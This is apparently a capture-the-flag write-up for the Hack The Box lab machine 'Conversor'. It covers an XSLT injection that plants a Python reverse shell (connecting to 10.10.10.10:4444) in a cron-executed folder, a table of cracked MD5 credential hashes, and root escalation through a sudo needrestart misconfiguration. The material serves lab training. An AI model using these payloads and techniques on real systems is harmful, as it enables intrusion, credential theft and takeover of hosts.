---
title: Conversor
date: 2025-10-29
description: Easy Linux machine running a Flask-based XSLT converter with exposed source code — exploiting an unrestricted XSLT parser to write a reverse shell into a cron-executed directory, cracking MD5-hashed credentials for SSH, and escalating via a needrestart sudo misconfiguration.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```bash
# Nmap 7.95 scan initiated Tue Oct 28 14:51:21 2025 as: /usr/lib/nmap/nmap -p22,80 -A -oN scan_results.txt 10.10.11.92
Nmap scan report for conversor.htb (10.10.11.92)
Host is up (0.40s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-title: Login
|_Requested resource was /login
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   424.83 ms 10.10.14.1
2   424.94 ms conversor.htb (10.10.11.92)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 28 14:52:03 2025 -- 1 IP address (1 host up) scanned in 41.60 seconds
```
Port `80` exposed a sample XSLT template, and `/about` published the full source code. Key findings:

- `users.db` — username/hash storage
- `app.py` — XSLT parsed without security restrictions
- `install.md` — a cronjob executes Python scripts in `/scripts`

In `app.py`, the XML parser was hardened but the XSLT side was not:

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)
transform = etree.XSLT(xslt_tree)
```

The XML input defends against XXE and remote resource fetching — but the unrestricted XSLT parser allows dangerous constructs like `<xsl:document>` for file writes.

`install.md` documented the cron entry:

```text
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

# User

## XSLT Injection

An XSLT payload using the `exsl:document` extension wrote a Python reverse shell directly into the cron-watched directory:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">

  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/rev.py" method="text">
      <xsl:text>#!/usr/bin/env python3
import socket, subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
</xsl:text>
    </exsl:document>
    <html><body>Python shell written to /scripts/rev.py</body></html>
  </xsl:template>

</xsl:stylesheet>
```

The cron job executed the script within a minute — shell captured as `www-data`.

## Credential Recovery

The SQLite database at `instance/users.db` held MD5-hashed credentials:

| Username   | Hashed Password                  |
| ---------- | -------------------------------- |
| admin      | 21232f297a57a5a743894a0e4a801fc3 |
| test       | 098f6bcd4621d373cade4e832627b4f6 |
| wega20     | e10adc3949ba59abbe56e057f20f883e |
| Franco     | fb9adcedc1441b0798ec385a378e41fc |
| mshural    | 5026691f9496e4c0708984118b559689 |
| vtxda      | 1bb96ac9a3cfec25ae0865fdf41032   |
| simo       | 43bd48ade3219a1931115a1dabbe1a7f |
| fismathack | 5b5c3ac3a1c897c94caad48e6c71fdec |

`fismathack`'s hash was cracked:

```text
fismathack : Keepmesafeandwarm
```

# Root

`sudo -l` revealed `fismathack` could run **needrestart** with root privileges.

`needrestart 3.7` is affected by **CVE-2024-48990**, but public exploits required `apt install` or GCC — neither available. Reviewing the needrestart config source revealed it evaluates Perl code from `.conf` files passed via the `-c` flag:

```perl
foreach my $fn (sort </etc/needrestart/conf.d/*.conf>) {
    eval do { local(@ARGV, $/) = $fn; <>};
}
```

A Perl reverse shell payload was dropped as `rev.conf` and executed:

```bash
sudo needrestart -c rev.conf
```

Unstable root shell on the listener — stabilized with `/bin/bash -p` and persistence established via `id_rsa` keys.

Gained `root`
